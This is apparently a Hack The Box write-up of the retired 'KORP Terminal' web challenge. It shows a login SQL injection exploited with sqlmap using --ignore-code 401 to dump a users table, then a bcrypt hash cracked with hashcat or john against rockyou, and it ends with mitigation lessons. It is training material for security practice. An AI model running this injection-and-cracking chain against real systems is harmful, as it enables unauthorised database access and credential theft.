---
challenge: KORP Terminal
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, mysql, bcrypt, sqlmap, cyber-apocalypse-2024]
---

# KORP Terminal — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A login that concatenates its query: a single quote produces a **MySQL error** in the response. The app answers **401** even while showing the error, so `sqlmap` needs `--ignore-code 401`. Dump `korp_terminal.users`, the **bcrypt** hash (`$2b$12$`) falls to rockyou, and you log in as `admin`.

## Brief

A web instance with a single terminal screen and two fields (`username`, `password`) sent by `POST`. No source code.

## Recon

```bash
curl -s http://<IP>:<PORT>/ | head -40
# capture the login request into login.req from Burp to keep the headers
```

## The flaw

```text
username=admin'&password=x
```

```text
(1064, "You have an error in your SQL syntax ... near '' at line 1")
```

The error travels in the response, but the HTTP status is **401**: any tool that aborts on 401 (`sqlmap` included, by default) concludes the endpoint is not injectable. Ignore it explicitly.

## Exploitation

```bash
sqlmap -r login.req --batch --ignore-code 401 --dbs
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal --tables
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal -T users --dump
```

```text
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
| 1  | admin    | $2b$12$<hash>                                                |
+----+----------+--------------------------------------------------------------+
```

The `$2b$12$` prefix is **bcrypt at cost 12**: slow by design, so only a sensible dictionary makes sense.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# or: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

With `admin:<password>` the login returns the flag.

## Evidence

- Trimmed output of the key commands; no flags or credentials.
- Real values live in `private/` and are not published.

## Lessons

- **`--ignore-code 401`**: without it, `sqlmap` gives up, treating the endpoint as unreachable.
- **`-r` with the full request**: keeps method, cookies and headers; the injection is in the body.
- **bcrypt is not "broken"**: it is guessed with a dictionary; cost 12 caps the speed.

- A database error exposed in production is a map for the attacker.
- A misleading status code does not stop injection: the response is still valid.
- Mitigation: parameterised queries, generic errors, and bcrypt/argon2 with strong passwords.
